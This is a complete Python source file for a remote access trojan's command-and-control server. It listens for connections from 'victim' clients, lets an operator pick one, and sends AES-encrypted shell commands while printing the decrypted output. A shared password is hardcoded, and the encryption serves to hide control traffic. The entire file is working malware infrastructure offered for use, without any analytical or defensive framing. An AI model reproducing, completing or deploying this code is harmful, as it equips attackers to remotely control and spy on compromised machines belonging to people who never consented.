# rat_server.py
import socket
import threading
import sys
import os
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import base64
import os as crypto_os 

# --- Configuration ---
LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 9999
BUFFER_SIZE = 4096
def debug_print(message):

    print(f"[RAT] {message}")
SHARED_PASSWORD = b"MyS3cr3tP@ssw0rd!2024" 
SALT = b"ratsalt12345678" 

clients = {}
clients_lock = threading.Lock()

# --- Simple Encryption Setup ---
backend = default_backend()

def derive_key(password: bytes, salt: bytes) -> bytes:
    """Derives a 32-byte AES key from a password and salt."""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=backend
    )
    key = kdf.derive(password)
    return key

# Derive the key once at startup
try:
    AES_KEY = derive_key(SHARED_PASSWORD, SALT)
    print("[+] Encryption key derived from password.")
except Exception as e:
    print(f"[-] Error deriving encryption key: {e}")
    sys.exit(1)

def encrypt_data(data: str) -> bytes:
    """Encrypts data using AES-256-CBC and returns base64 encoded bytes."""
    if not AES_KEY:
        return data.encode('utf-8')
    
    try:
        # Ensure data is bytes
        if isinstance(data, str):
            data = data.encode('utf-8')
            
        iv = crypto_os.urandom(16)
        cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(iv), backend=backend)
        encryptor = cipher.encryptor()
        
        # PKCS7 padding
        pad_len = 16 - (len(data) % 16)
        padded_data = data + bytes([pad_len] * pad_len)
        
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()
        return base64.b64encode(iv + ciphertext)
    except Exception as e:
        debug_print(f"Encryption error: {e}")
        return data if isinstance(data, bytes) else data.encode('utf-8')

def decrypt_data(data: bytes) -> str:
    """Decrypts base64 encoded data using AES-256-CBC."""
    if not AES_KEY:
        try:
            return data.decode('utf-8')
        except:
            return str(data)
    
    try:
        # Handle potential string input
        if isinstance(data, str):
            data = data.encode('utf-8')
            
        encrypted_data = base64.b64decode(data)
        if len(encrypted_data) < 16:
            raise ValueError("Data too short for IV")
            
        iv = encrypted_data[:16]
        ciphertext = encrypted_data[16:]
        
        cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(iv), backend=backend)
        decryptor = cipher.decryptor()
        padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
        
        # More lenient padding validation
        pad_len = padded_plaintext[-1]
        if pad_len > 16:
            debug_print("Padding warning: invalid pad length, trying to strip last byte")
            pad_len = 1
            
        plaintext = padded_plaintext[:-pad_len]
        return plaintext.decode('utf-8')
    except Exception as e:
        debug_print(f"Decryption error: {e}")
        try:
            return data.decode('utf-8')
        except:
            return str(data)

def handle_client(client_socket, address):
    """Handles communication with a single connected client (Victim)."""
    print(f"\n[+] Accepted connection from {address}")
    client_name = f"Client-{address[0]}:{address[1]}"

    with clients_lock:
        clients[client_socket] = (address, client_name)

    try:
        while True:
            data = client_socket.recv(BUFFER_SIZE)
            if not data :
                break
            # --- Decrypt received data ---
            decrypted_response = decrypt_data(data)
            print(f"\n[RECV from {client_name} ({address})]:\n{decrypted_response}\n---END OF RESPONSE---")

    except ConnectionResetError:
        print(f"[-] Connection reset by {client_name} ({address})")
    except Exception as e:
        print(f"[-] Error handling client {client_name} ({address}): {e}")
    finally:
        client_socket.close()
        with clients_lock:
            if client_socket in clients:
                del clients[client_socket]
        print(f"[-] Connection with {client_name} ({address}) closed.")

def send_commands():
    """Thread function to read commands from the server operator and send them."""
    while True:
        try:
            with clients_lock:
                if clients:
                    print("\n--- Connected Clients ---")
                    client_list = list(clients.items())
                    for i, (sock, (addr, name)) in enumerate(client_list):
                        print(f"{i}: {name} ({addr})")
                    print("-------------------------")
                else:
                    print("\n[!] No clients connected.")

            if not clients:
                import time
                time.sleep(2)
                continue

            command_input = input("\nRAT Server> ").strip()

            if not command_input:
                continue

            if command_input.lower().startswith("select "):
                try:
                    index = int(command_input.split()[1])
                    with clients_lock:
                        client_list = list(clients.items())
                        if 0 <= index < len(client_list):
                            selected_socket, (addr, name) = client_list[index]
                            print(f"[+] Selected client: {name} ({addr})")
                            interact_with_client(selected_socket, name, addr)
                        else:
                            print("[!] Invalid client index.")
                except (ValueError, IndexError):
                    print("[!] Usage: select <index>")

            elif command_input.lower() == "list":
                pass
            elif command_input.lower() == "exit":
                print("[+] Shutting down RAT Server...")
                with clients_lock:
                     sockets_to_close = list(clients.keys())
                for sock in sockets_to_close:
                    try:
                        sock.close()
                    except:
                        pass
                os._exit(0)
            else:
                print("[!] Please 'select <index>' a client first, or type 'list' or 'exit'.")

        except KeyboardInterrupt:
            print("\n[!] KeyboardInterrupt received. Exiting...")
            os._exit(0)
        except Exception as e:
            print(f"[!] Error in command input: {e}")

def interact_with_client(client_socket, client_name, address):
    """Sends commands to a specific client and waits for the response."""
    print(f"[+] Interacting with {client_name} ({address}). Type 'back' to return to main prompt.")
    try:
        while True:
            cmd = input(f"RAT ({client_name})> ").rstrip('\n') # Strip potential newlines
            if not cmd:
                continue
            if cmd.lower() == 'back':
                break
            # --- Encrypt command before sending ---
            encrypted_cmd = encrypt_data(cmd + "\n") # Add newline back for client parsing
            if encrypted_cmd:
                client_socket.sendall(encrypted_cmd)
                print(f"[+] Encrypted command sent to {client_name}. Awaiting response...")
            else:
                print("[!] Failed to encrypt command. Not sent.")

    except Exception as e:
        print(f"[!] Error interacting with {client_name}: {e}")
        with clients_lock:
            if client_socket in clients:
                del clients[client_socket]
        try:
            client_socket.close()
        except:
            pass

def main():
    print(f"[+] Starting RAT Server on {LISTEN_IP}:{LISTEN_PORT}...")

    try:
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_sock.bind((LISTEN_IP, LISTEN_PORT))
        server_sock.listen(5)
        print(f"[+] Server listening for RAT client connections (Encryption enabled)...")

        command_thread = threading.Thread(target=send_commands, daemon=False)
        command_thread.start()
        while True:
            client_sock, addr = server_sock.accept()
            client_thread = threading.Thread(target=handle_client, args=(client_sock, addr))
            client_thread.daemon = True
            client_thread.start()

    except KeyboardInterrupt:
        print("\n[!] Server stopped by user (Ctrl+C).")
    except Exception as e:
        print(f"[-] An unexpected server error occurred: {e}")
    finally:
        try:
            server_sock.close()
            print("[+] Server socket closed.")
        except:
            pass

if __name__ == "__main__":
    main()